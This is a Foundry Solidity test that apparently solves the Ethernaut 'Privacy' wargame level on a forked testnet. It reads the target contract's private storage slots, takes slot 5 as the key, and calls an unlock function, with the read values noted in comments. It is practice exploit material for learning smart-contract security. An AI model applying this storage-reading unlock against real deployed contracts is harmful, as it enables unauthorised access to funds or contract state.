// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {Utils} from "test/utils/Utils.sol";

import {PrivacySolution} from "../PrivacySolution.sol";

// solhint-disable func-name-mixedcase, no-console, no-empty-blocks
contract PrivacyForkTest is Test {
  address private privacyContract = 0xc2C4af7424bC12b7147E72294b162B0Ab942C9e3;
  address private user = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;

  // CONTRACTS ////////////////////////////////////////////////////////////////
  PrivacySolution private privacySolution;

  // Initialize ///////////////////////////////////////////////////////////////
  function setUp() external {
    vm.createSelectFork(stdChains["optimism_goerli"].rpcUrl, 10_882_217);

    vm.prank(user);
    privacySolution = new PrivacySolution();
  }

  /////////////////////////////////////////////////////////////////////////////
  //                                  TESTS                                  //
  /////////////////////////////////////////////////////////////////////////////

  function test_01_unlockContract() external {
    bytes32 slot0 = vm.load(address(privacyContract), bytes32(uint256(0)));
    emit log_bytes32(slot0); // 0x0000000000000000000000000000000000000000000000000000000000000001

    bytes32 slot1 = vm.load(address(privacyContract), bytes32(uint256(1)));
    emit log_bytes32(slot1); // 0x000000000000000000000000000000000000000000000000000000006387d60c

    bytes32 slot2 = vm.load(address(privacyContract), bytes32(uint256(2)));
    emit log_bytes32(slot2); // 0x00000000000000000000000000000000000000000000000000000000d60cff0a

    bytes32 slot3 = vm.load(address(privacyContract), bytes32(uint256(3)));
    emit log_bytes32(slot3); // 0xb968eeb8ce39d2764b0d7091cc5f071261537c9085739097db453e86f1fc4d28

    bytes32 slot4 = vm.load(address(privacyContract), bytes32(uint256(4)));
    emit log_bytes32(slot4); // 0xa38fe1dd905aab0f93ed562e5ae7ff2fabfa71e47c445bce5b8cfd739eac64cd

    bytes32 slot5 = vm.load(address(privacyContract), bytes32(uint256(5)));
    emit log_bytes32(slot5); // 0xbd92eb6003f98e3362cc82206aa04fce6b2eddedd49e0b74abe3674cfea18f24

    bytes16 _key = bytes16(slot5); // 0xbd92eb6003f98e3362cc82206aa04fce

    vm.prank(user);
    bool result = privacySolution.callUnlock(_key);

    console2.log("----------------------------------------------------------");
    console2.log("result", result);
    console2.log("----------------------------------------------------------");

    slot0 = vm.load(address(privacyContract), bytes32(uint256(0)));
    emit log_bytes32(slot0); // 0

    assert(result);
  }
}
